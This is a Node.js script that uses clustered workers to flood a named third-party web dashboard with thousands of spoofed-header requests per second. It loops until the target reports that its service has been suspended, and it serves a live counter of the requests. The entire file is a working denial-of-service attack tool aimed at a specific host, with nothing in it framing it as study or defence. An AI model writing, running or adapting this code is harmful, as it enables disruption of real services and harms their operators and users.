const axios = require('axios');
const express = require('express');
const cluster = require('cluster');
const os = require('os');
const pino = require('pino')();
const { exec } = require('child_process');

exec('npm install', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error executing npm install: ${error}`);
        return;
    }
    console.log(`npm install output: ${stdout}`);
    console.error(`npm install stderr: ${stderr}`);

    // Start the server after npm install is complete
    startServer();
});

let url_dashboard = 'https://top10chickennuggetsyeahyeah.onrender.com/dashboard';

const headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Authorization": "f081697ffa248",
    "Origin": "https://hyperium-scanner.vercel.app",
    "Referer": "https://hyperium-scanner.vercel.app/",
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
};

const requests_per_second = 5000;
const inactivity_threshold = 30000; // 30 seconds

let total_requests = 0;
let dashboard_requests = 0;
let successful_requests = 0;
let failed_requests = 0;
let last_request_time = Date.now();

async function sendRequest(url, headers) {
    try {
        let response = await axios.get(url, { headers });
        dashboard_requests++;
        total_requests++;
        last_request_time = Date.now();

        if (response.status === 200 || response.data === '{"error":"Unauthorized."}') {
            successful_requests++;
        } else {
            failed_requests++;
            if (response.data.includes("This service has been suspended.")) {
                throw new Error("Service suspended");
            }
        }
    } catch (error) {
        failed_requests++;
        if (error.message === "Service suspended" || (error.response && error.response.data && error.response.data.includes("This service has been suspended."))) {
            throw error;
        }
    }
}

async function spamApi() {
    while (true) {
        try {
            let tasks = [];
            for (let i = 0; i < requests_per_second; i++) {
                tasks.push(sendRequest(url_dashboard, headers));
            }
            await Promise.all(tasks);
            await new Promise(resolve => setTimeout(resolve, 1000));

            if (Date.now() - last_request_time > inactivity_threshold) {
                pino.info("Inactivity detected. Restarting the process...");
                process.exit(1);
            }
        } catch (error) {
            if (error.message === "Service suspended" || (error.response && error.response.data && error.response.data.includes("This service has been suspended."))) {
                pino.info("Service suspended, stopping requests...");
                break;
            }
        }
    }
}

async function runRequests() {
    await spamApi();
}

function logRequests() {
    pino.info(`Total requests: ${total_requests}`);
    pino.info(`Dashboard requests: ${dashboard_requests}`);
    pino.info(`Successful requests: ${successful_requests}`);
    pino.info(`Failed requests: ${failed_requests}`);
    successful_requests = 0;
    failed_requests = 0;
}

function startServer() {
    if (cluster.isMaster) {
        const numCPUs = os.cpus().length;
        pino.info(`Master ${process.pid} is running`);

        for (let i = 0; i < numCPUs; i++) {
            cluster.fork();
        }

        cluster.on('exit', (worker, code, signal) => {
            pino.info(`Worker ${worker.process.pid} died`);
        });

        setInterval(logRequests, 10000);
    } else {
        const app = express();

        app.get('/', (req, res) => {
            const html = `
            <html>
                <head>
                    <title>Dashboard</title>
                    <meta http-equiv="refresh" content="1">
                </head>
                <body>
                    <h1>Dashboard</h1>
                    <p>Total requests: ${total_requests}</p>
                    <p>Dashboard requests: ${dashboard_requests}</p>
                    <p>Successful requests: ${successful_requests}</p>
                    <p>Failed requests: ${failed_requests}</p>
                    <p>Current API: ${url_dashboard}</p>
                </body>
            </html>
            `;
            res.send(html);
        });

        const port = process.env.PORT || 8080;
        app.listen(port, '0.0.0.0', () => {
            pino.info(`Server started at http://0.0.0.0:${port}`);
            runRequests();
        });
    }
}
